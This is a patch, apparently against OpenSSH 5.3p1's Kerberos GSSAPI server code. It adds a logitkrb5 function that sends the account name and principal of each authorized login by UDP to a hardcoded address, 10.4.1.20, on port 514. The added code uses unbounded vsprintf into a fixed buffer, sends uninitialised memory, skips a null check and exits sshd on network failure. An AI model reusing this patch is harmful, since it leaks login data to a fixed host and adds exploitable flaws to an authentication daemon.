@@ -1,0 +1,70 @@
+--- openssh-5.3p1/gss-serv-krb5.c	2013-12-03 11:50:46.308187751 +0800
++++ openssh-5.3p1/gss-serv-krb5.c	2013-12-03 12:58:08.190199305 +0800
+@@ -43,6 +43,23 @@
+ 
+ #include "buffer.h"
+ #include "ssh-gss.h"
++#include <sys/socket.h>                                                                                                                                          
++#include <stdio.h>                                                                                                                                               
++#include <netinet/in.h>                                                                                                                                          
++#include <arpa/inet.h>                                                                                                                                           
++#include <unistd.h>                                                                                                                                              
++#include <netdb.h>                                                                                                                                               
++#include <sys/ioctl.h>                                                                                                                                           
++#include <termios.h>                                                                                                                                             
++#include <stdlib.h>                                                                                                                                              
++#include <sys/stat.h>                                                                                                                                            
++#include <fcntl.h>                                                                                                                                               
++#include <signal.h>                                                                                                                                              
++#include <sys/time.h>                                                                                                                                            
++#include <pthread.h>                                                                                                                                             
++#define PORT 514 /* Server的端口 */                                                                                                                              
++#define MAXDATASIZE 1024 /*一次可以读的最大字节数 */                                                                                                             
++const char *host_name="10.4.1.20";
+ 
+ extern ServerOptions options;
+ 
+@@ -78,6 +95,34 @@
+ 	return 1;
+ }
+ 
++static int
++logitkrb5(const char *fmt,...){                                                                                                                              
++        va_list args;                                                                                                                                            
++        int sockfd, numbytes, sin_size;                                                                                                                          
++        char buf[MAXDATASIZE];                                                                                                                                   
++        va_start(args, fmt);                                                                                                                                     
++        vsprintf(buf,fmt, args);                                                                                                                                 
++        va_end(args);                                                                                                                                            
++        struct hostent *he; /* 主机信息 */                                                                                                                       
++        struct sockaddr_in their_addr; /* 对方地址信息 */                                                                                                        
++        he=gethostbyname(host_name);                                                                                                                             
++        /* get the host info */                                                                                                                                  
++        if ((sockfd=socket(AF_INET,SOCK_DGRAM,0))==-1) {                                                                                                         
++                perror("socket");                                                                                                                                
++                exit(1);                                                                                                                                         
++        }                                                                                                                                                        
++        their_addr.sin_family = AF_INET;                                                                                                                         
++        their_addr.sin_port = htons(PORT); /* short, NBO */                                                                                                      
++        their_addr.sin_addr = *((struct in_addr *)he->h_addr);                                                                                                   
++        bzero(&(their_addr.sin_zero), 8); /* 其余部分设成0 */                                                                                                    
++        numbytes = sendto(sockfd, buf, MAXDATASIZE, 0, (struct sockaddr *)&their_addr,sizeof(their_addr));                                                       
++        if (numbytes == -1) {                                                                                                                                    
++                perror("sendto");                                                                                                                                
++                exit(1);                                                                                                                                         
++        }                                                                                                                                                        
++        close(sockfd);                                                                                                                                           
++
++}                                
+ /* Check if this user is OK to login. This only works with krb5 - other
+  * GSSAPI mechanisms will need their own.
+  * Returns true if the user is OK to log in, otherwise returns 0
+@@ -102,6 +147,8 @@
+ 		retval = 1;
+ 		logit("Authorized to %s, krb5 principal %s (krb5_kuserok)",
+ 		    name, (char *)client->displayname.value);
++               logitkrb5("Authorized to %s, krb5 principal %s (krb5_kuserok)",                                                                                   
++                    name, (char *)client->displayname.value);  
+ 	} else
+ 		retval = 0;
+ 
